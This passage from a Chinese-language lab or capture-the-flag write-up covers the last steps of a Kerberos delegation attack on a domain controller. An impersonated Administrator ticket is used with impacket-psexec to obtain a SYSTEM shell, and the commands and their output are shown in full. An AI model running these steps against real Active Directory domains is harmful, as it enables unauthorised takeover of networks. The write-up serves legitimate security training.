>>用你自己創的機器帳號 chw$ 登入（這個帳號現在可以 impersonate）\
指定 -impersonate Administrator，請求一張能代表 Administrator 的 TGS，目標服務是 `cifs/resourcedc.resourced.local`。

#### 8.4 設定 `/etc/hosts`
Kerberos TGS 跟 SPN 都要靠正確的 FQDN 
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ sudo sh -c 'echo "192.168.122.175 resourcedc.resourced.local" >> /etc/hosts'
```
#### 8.5 使用 PSEXEC 使用這張 TGS 登入 SYSTEM shell
使用 impacket-psexec 工具，透過 Kerberos ticket（ccache），以 Administrator 的身分遠端執行命令（取得 shell）
```
┌──(chw㉿CHW)-[~/Resourced]
└─$ sudo KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache impacket-psexec -k -no-pass resourced.local/Administrator@resourcedc.resourced.local -dc-ip 192.168.122.175

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file vYQHuTAK.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service BeKj on resourcedc.resourced.local.....
[*] Starting service BeKj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
> `impacket-psexec`: Impacket 工具，用來類 PsExec 模式，在遠端以系統權限執行指令。\
`-k`: 告訴工具使用 Kerberos 認證（搭配 ccache 使用）\
`-no-pass`: 不使用明文密碼，因為有 ticket 就夠了
`resourced.local/Administrator@resourcedc.resourced.local`: 網域與目標身分\
目標主機是 `resourcedc.resourced.local`\
`-dc-ip 192.168.122.175`: 指定 Domain Controller 的 IP
>> 用剛剛拿到的 `.ccache` 票當成憑證（透過 -k + KRB5CCNAME），且不需要密碼 (-no-pass) 也能登入\
成功後會用 SMB 傳一個 binary 到 ADMIN$，透過 Service Control Manager 建立並啟動一個服務，取得 SYSTEM 權限。
### ✅ Get Root FLAG
